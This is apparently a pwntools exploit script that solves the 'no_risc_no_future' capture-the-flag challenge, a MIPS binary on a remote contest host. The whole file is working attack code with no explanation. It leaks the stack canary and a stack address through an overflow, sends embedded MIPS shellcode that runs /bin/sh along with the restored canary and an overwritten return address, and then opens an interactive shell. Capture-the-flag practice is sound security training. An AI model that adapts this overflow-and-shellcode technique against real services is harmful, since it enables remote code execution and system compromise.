from pwn import *
context.log_level = 'debug'

TARGET = './no_risc_no_future'
HOST = 'noriscnofuture.forfuture.fluxfingers.net'
PORT = 1338

# r = process(TARGET)
# r = process(["./qemu-mipsel-static", "-g", "1234", "no_risc_no_future"])
# r = process(["./qemu-mipsel-static", "no_risc_no_future"])
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
r = remote(HOST, PORT)

elf = ELF(TARGET)

SHELL = "\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh" 

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

print util.proc.pidof(r)
pause()
r.sendline('A' * 64)
r.recvuntil('\n')
canary = u32('\x00'+r.recvuntil('\n')[:-1])
dbg("canary")

r.sendline('A' * 64+'B'*39)
r.recvuntil('\n')
stack_leak = u32(r.recv(4))
dbg("stack_leak")
target = stack_leak - 0x48
dbg("target")

payload = ''
payload += 'A'*4
payload += SHELL
payload = payload.ljust(64, '\x00')
payload += p32(canary)
payload += p32(0x408f70)
payload += p32(target) 

r.sendline(payload)

for _ in range(6):
    r.sendlineafter('\n', '') 
    r.recvuntil('\n') 
    
r.sendlineafter('\n', '') 

r.interactive()
r.close()
